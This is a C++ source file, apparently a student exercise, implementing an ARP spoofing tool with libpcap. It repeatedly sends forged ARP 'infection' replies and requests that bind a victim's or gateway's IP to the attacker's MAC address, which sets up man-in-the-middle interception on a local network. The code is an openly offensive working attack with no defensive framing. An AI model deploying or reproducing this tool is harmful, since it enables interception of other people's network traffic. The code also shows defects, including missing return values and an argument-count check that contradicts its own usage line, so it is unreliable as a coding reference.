#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

using namespace std;

#define PROMISCUOUS 1
#define	ETHERTYPE_ARP		0x0806
#define	ETHERTYPE_IP		0x0800

    struct ether_arp_hdr
    {
          unsigned char   	h_dest[6];	/* destination eth addr	*/
          unsigned char   	h_source[6];	/* source ether addr	*/
          unsigned short    h_proto;		/* packet type ID field	*/

          unsigned short int ar_hrd;		/* Format of hardware address.  */
          unsigned short int ar_pro;		/* Format of protocol address.  */
          unsigned char ar_hln;		/* Length of hardware address.  */
          unsigned char ar_pln;		/* Length of protocol address.  */
          unsigned short int ar_op;		/* ARP opcode (command).  */

          unsigned char __ar_sha[6];	/* Sender hardware address.  */
          unsigned char __ar_sip[4];		/* Sender IP address.  */
          unsigned char __ar_tha[6];	/* Target hardware address.  */
          unsigned char __ar_tip[4];		/* Target IP address.  */

    };


    struct ether_arp_hdr *eth_arp_hdr;
    struct ifreq ifr;


 char change_mac(char mac[], unsigned char *packet) {

     sscanf(mac, "%x:%x:%x:%x:%x:%x", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
 }

 int get_my_mac(char *dev, unsigned char *packet) {

     int fd;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
     if(fd < 0) {
         cout << "Socket error" << endl;
         return -1;
     }

     strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
         cout << "Mac error" << endl;
         return -1;
     }

     for(int i=0; i<6; i++) {
         packet[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
     }
 }

 int put_ip(char argv[], unsigned char *packet) {

     sockaddr_in addr;
     addr.sin_addr.s_addr = inet_addr(argv);
     memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

 }

 int arp_infection_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {

     change_mac(argd, eth_arp_hdr->h_dest); // Ethernet Destination
     for(int i=0; i<6; i++) { // Ethernet Source
         eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
     }

     // ARP
     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
     eth_arp_hdr->ar_hrd = htons(0x0001);
     eth_arp_hdr->ar_pro = htons(0x0800);
     eth_arp_hdr->ar_hln = 0x06;
     eth_arp_hdr->ar_pln = 0x04;
     eth_arp_hdr->ar_op = htons(0x0002);

     put_ip(argb, eth_arp_hdr->__ar_sip); // Sender ip
     get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac
     change_mac(argd, eth_arp_hdr->__ar_tha); // Target mac
     put_ip(argc, eth_arp_hdr->__ar_tip); // Target ip

     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
              cout << "Send infaction packet" << endl;
              return -1;
     }
     else cout << endl << endl << "Send infaction packet" << endl;
 }

 int arp_request(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {

    // Attacker -> Target
     memset(eth_arp_hdr->h_dest, 0xff, 6);// Request Ethernet Destination
     get_my_mac(arga, eth_arp_hdr->h_source); // Request Ethernet Source

     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
     eth_arp_hdr->ar_hrd = htons(0x0001);
     eth_arp_hdr->ar_pro = htons(0x0800);
     eth_arp_hdr->ar_hln = 0x06;
     eth_arp_hdr->ar_pln = 0x04;
     eth_arp_hdr->ar_op = htons(0x0001);

     put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
     get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac = My mac
     memset(eth_arp_hdr->__ar_tha, 0xff, 6); // Target mac = broadcast
     put_ip(argb, eth_arp_hdr->__ar_tip); // Target ip = gateway ip

     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
              cout << "Error request packet" << endl;
              return -1;
     }
     else cout << endl << endl << "Send request packet" << endl;
 }


 int relay_ip_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd, unsigned char *packet) {

     // Attacker -> Target
     memcpy(eth_arp_hdr->h_dest, packet, sizeof(eth_arp_hdr->h_dest)); // Destination = gateway mac address
     get_my_mac(arga, eth_arp_hdr->h_source); // source = My mac address

     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
     eth_arp_hdr->ar_op = htons(0x0001);
     eth_arp_hdr->ar_pro = htons(0x0800);
     eth_arp_hdr->ar_hln = 0x06;
     eth_arp_hdr->ar_pln = 0x04;

     put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
     change_mac(argd, eth_arp_hdr->__ar_sha); // Sender mac = My mac

     memcpy(eth_arp_hdr->__ar_tha, packet, sizeof(eth_arp_hdr->__ar_tha)); // Target mac = broadcast
     put_ip(argb, eth_arp_hdr->__ar_tip); // Target ip = gateway ip


     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
              cout << "Error relay packet" << endl;
              return -1;
     }
     else cout << endl << endl << "Send relay packet" << endl;
 }


int main(int argc, char *argv[])
{
    if (argc != 5) {
        cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac ip_network_address";
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    cout << endl << "Device : " << dev << endl << endl;

    pcap_t *pcd; // packet captuer descripter
    if ((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 500, errbuf)) == NULL) {
        cout << "Unable to open the Adapter.";
        return -1;
    }

    struct ethhdr *ep;
    struct pcap_pkthdr *pkthdr;
    eth_arp_hdr = new ether_arp_hdr;
    const u_char *packet;
    int res;

    while(1) {
        
        arp_infection_packet(argv[1], argv[2], argv[3], argv[4], pcd);
        arp_request(argv[1], argv[2], argv[3], argv[4], pcd);

        while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) { // ethernet packet

            sleep(1);

            if(res == 0) continue;
            if(res < 0) {
                cout << "Error reading the packets" << pcap_geterr(pcd);
                return -1;
            }

            ep = (struct ethhdr*)packet;

            if(htons(ep->h_proto) == ETHERTYPE_ARP) {
                sleep(1);
                relay_ip_packet(argv[1], argv[2], argv[3], argv[4], pcd, ep->h_source);
              //  arp_infection_packet(argv[1], argv[2], argv[3], argv[4], argv[5], pcd);
                // here, infection packet need if
                break;
            }
        }
    sleep(2);
    }
}



/*

    FILE *fp;
    char buff[1024];

    fp = popen("ifconfig", "r");
    if(fp == NULL) return -1;
    while(fgets(buff, sizeof(buff), fp)) { printf("--%s", buff); }
    pclose(fp);

    regex rx("HWaddr ([^ ])*");
    printf("%s", rx);

 */

